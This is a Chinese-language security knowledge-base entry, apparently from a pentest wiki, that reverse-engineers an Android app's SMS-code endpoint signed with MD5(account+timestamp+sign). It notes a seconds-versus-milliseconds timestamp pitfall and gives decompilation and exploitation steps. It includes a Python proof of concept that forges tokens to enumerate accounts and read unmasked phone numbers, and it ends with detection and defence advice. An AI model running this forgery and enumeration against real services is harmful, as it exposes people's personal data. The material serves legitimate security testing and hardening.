---
id: mobile-android-token-md5-account-timestamp-sign-reverse
title: App 请求 token 签名逆向：MD5(account+timestamp+sign) 与时间戳单位坑
type: scenario
domain: mobile
path: mobile/android
technique: android-token-md5-account-timestamp-sign-reverse
tags:
- android
- api-reverse
- signature
- md5
- account-enumeration
- pii-leak
- mobile
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V122
  verified_at: '2026-11-06T04:17:18+08:00'
  notes: 已对照原文与25张截图核对：sendAccountCode 中 timestamp=currentTimeMillis()/1000、sign=RangesKt.random(...,999999)、token=md5(account+timestamp+sign)、getRequestHeadersToken 放请求头 token、秒级返回“无效时间参数”而毫秒级通过、响应回显完整手机号均一致。未验证点：未复跑批量枚举脚本；sign 下界常量在截图中被部分遮挡。
url: /docs/mobile/android/mobile-android-token-md5-account-timestamp-sign-reverse/
draft: false
kb_aliases:
- App 签名 token 逆向
- MD5(account+timestamp+sign)
- 短信接口 token 伪造
- 账号枚举 手机号泄露
- timestamp 秒/毫秒坑
---

## 一句话结论

App 的短信接口把 `token = MD5(account + timestamp + sign)` 放在请求头，`sign` 是随机 6 位数、`timestamp` 参与签名；从 APK 还原拼接顺序后即可为任意 `account` 生成合法 token，批量枚举账号并读取响应中未脱敏的完整手机号。注意时间戳单位（秒 vs 毫秒）会导致“无效时间参数”。

## 原理

- 反编译定位：全局搜索 URI `smsCode/sendByAccount` → 常量 `SMS_CODE_SENDBY_ACCOUNT` → `sendAccountCode` 方法。
- 关键代码：
  ```java
  long ts = System.currentTimeMillis() / 1000;        // 代码里是秒
  int sign = RangesKt.random(new IntRange(0x..., 999999), Random.INSTANCE);
  json.put("account", account);
  json.put("timestamp", ts);
  json.put("sign", sign);
  String token = md5Encode(account + ts + sign);      // 拼接顺序固定
  headers.put("token", token);
  ```
- 服务端校验 `token == MD5(account + timestamp + sign)`，并检查 `timestamp` 在时间窗口内；因此只要按同样顺序拼接并做 MD5，就能为任意账号构造请求。
- 时间戳单位坑：代码用 `currentTimeMillis()/1000`（秒），但服务端实际按毫秒校验；传 10 位秒级会返回“无效时间参数”，传 13 位毫秒级才能通过。构造时需以服务端实际要求为准，并在 JSON 与 MD5 中使用同一个值。
- 为什么可行：签名算法完全在客户端、无服务端密钥/HMAC，字段顺序和 MD5 可静态还原；`sign` 虽然随机，但会随请求一起发送，攻击者无需预测。
- 影响：可批量枚举账号（如 6 位工号），响应返回完整手机号（前端 UI 做了脱敏，但响应体没有），造成 PII 泄露/账号枚举。

## 触发条件

- APK 未加壳/未混淆，签名逻辑可反编译；或已通过抓包推断出字段与拼接顺序。
- 接口使用固定字段 `account`/`timestamp`/`sign`，token 在请求头或参数中。
- 服务端只校验 MD5 与时间窗口，没有 CAPTCHA、设备指纹或频率限制。
- 响应体包含手机号/账号存在性等可用于枚举的信息。

## 利用步骤

1. `jadx` 反编译，搜索接口 URI/常量，定位 `sendAccountCode` 与 `getRequestHeadersToken`。
2. 记录 token 拼接顺序（account + timestamp + sign）、MD5 编码方式（小写 hex）、时间戳单位。
3. 先发一个合法账号请求，确认 token 算法；再改 `account`，若返回“无效签名参数”，检查拼接/单位/字段类型。
4. 用毫秒时间戳生成 token，构造 `{"account":"...","timestamp":...,"sign":...}`，请求头带 `token`。
5. 对账号字典批量请求，根据响应区分“账号不存在/成功”，并提取返回的完整手机号。
6. 控制频率，避免触发风控/骚扰；仅做授权测试并记录证据。

## PoC

```python
import hashlib, time, requests

BASE = "https://target"
def token_for(account: str, ts_ms: int, sign: int) -> str:
    return hashlib.md5(f"{account}{ts_ms}{sign}".encode()).hexdigest()

def probe(account: str):
    ts = int(time.time() * 1000)          # 服务端要毫秒
    sign = 912940                          # 随机 6 位，可任意
    r = requests.post(f"{BASE}/xx/xx/smsCode/sendByAccount",
                      headers={"token": token_for(account, ts, sign),
                               "Content-Type": "application/json",
                               "Accept": "application/json"},
                      json={"account": account, "timestamp": ts, "sign": sign},
                      timeout=10)
    print(account, r.status_code, r.text[:200])

for acc in ["030600", "020698", "020699"]:
    probe(acc)
```

说明：PoC 为原文流程的结构化复现，未在本机执行；原文通过该方式批量枚举账号并获取未脱敏手机号，注意合法授权与频率控制。

## 变体与关联

- 变体（签名）：HMAC-SHA256、AES 加密参数、nonce+timestamp、服务端挑战；密钥硬编码同样可从 APK 提取。
- 变体（字段）：token 放 header/query/body；sign 为随机数/固定盐/空；拼接分隔符不同。
- 变体（时间戳）：秒/毫秒、时区、服务端时间偏差；先用一个请求校准。
- 关联：[[mobile-android-c2-api-md5-salt-signature-replay]]（MD5(时间戳+盐) 的同类复现）；[[web-generic-auth-nested-md5-sign-reverse-forgery]]（嵌套参数排序 + MD5 签名）；[[web-generic-auth-sms-code-echo-response-arbitrary-login]]（短信接口回显导致登录绕过）。
- 边界：服务端改用 HMAC/服务端密钥、加 CAPTCHA/设备指纹/频率限制、或响应完全脱敏时，枚举与 PII 获取会受限。

## 检测与防御

- 检测：同一 IP/设备对短信接口的高频、账号递增请求；token 固定算法但账号变化；响应中出现完整手机号；UI 脱敏但响应未脱敏的差异。
- 防御：短信接口加图形/行为验证码、频率限制、设备指纹；响应只返回脱敏手机号/掩码，不返回账号存在性差异。
- 加固：签名使用服务端密钥 HMAC，绑定会话/设备；时间窗口 + nonce 防重放；对异常枚举行为告警与封禁。
